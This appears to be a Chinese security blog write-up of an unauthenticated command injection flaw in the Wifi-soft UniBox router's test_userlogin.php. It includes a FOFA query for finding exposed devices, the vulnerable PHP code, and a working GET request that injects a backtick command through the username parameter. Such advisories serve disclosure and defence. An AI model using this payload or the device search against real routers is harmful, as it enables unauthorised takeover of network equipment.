---
title: "Unibox路由器 authentication/test_userlogin.php 命令执行漏洞"
source: https://mrxn.net/jswz/unibox-authentication-test_userlogin-rce.html
asset_dir: assets/unibox路由器-authenticationtest_userlogin.php-命令执行漏洞
---

# Unibox路由器 authentication/test\_userlogin.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/3 08:26
- 7745浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

授权

数据库

JSON处理工具

---

# 漏洞简介

Wifi-soft UniBox controller 路由器产品中存在一个致命漏洞，`/authentication/test_userlogin.php` 受[命令注入](https://mrxn.net/tag/rce)漏洞的影响。未授权的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个路由器。

漏洞预警服务

# 影响版本

# fofa语法

> `body="Unibox" && body="Controller" || body="www.wifi-soft.com"`

# 漏洞分析

深入探索

安全

在线安全工具

SQL

直接看 `/authentication/test_userlogin.php` 的业务实现造成漏洞的关键部分如下

```
if ($_REQUEST['testuser'] == 1){
    $username = stripslashes(trim($_REQUEST['username'])); 
    $password = stripslashes(trim($_REQUEST['password'])); 
    $server = "localhost";
    $port = 1812;

    $tmp_file = tempnam("/tmp",'DA');
    $comm = "/usr/bin/radtest \"$username\" \"$password\" $server:$port 0 testing123 > $tmp_file";

    $reply = exec($comm);
```

如果 `testuser=1` 则直接将 `username` 和 `password` 拼接进 `$comm` 中后使用 `exec` 直接执行命令，无任何过滤或校验，造成[命令执行](https://mrxn.net/tag/rce)漏洞，因此我们只需要闭合双引号即可完成命令注入利用或者使用反引号执行命令。

网络安全

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用

> 支持cookie获取参数，注意检测位置以及多个参数均存在命令执行漏洞，别漏
>
> 如果不使用反引号执行命令，则需要先闭合双引号

```
GET /authentication/test_userlogin.php?testuser=1&username=`env>11.txt`%20%23%20 HTTP/1.1
Host: unibox.mrxn.net
```

访问命令执行结果文件 `/authentication/11.txt`

[![Unibox路由器 authentication/test_userlogin.php 命令执行漏洞](images/img-001-f4f9b5145237.webp)](https://image.mrxn.net/7d538ff60d8c429c93cc5ca8f4b99254.webp)

成功获得 `env` 命令执行的结果

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
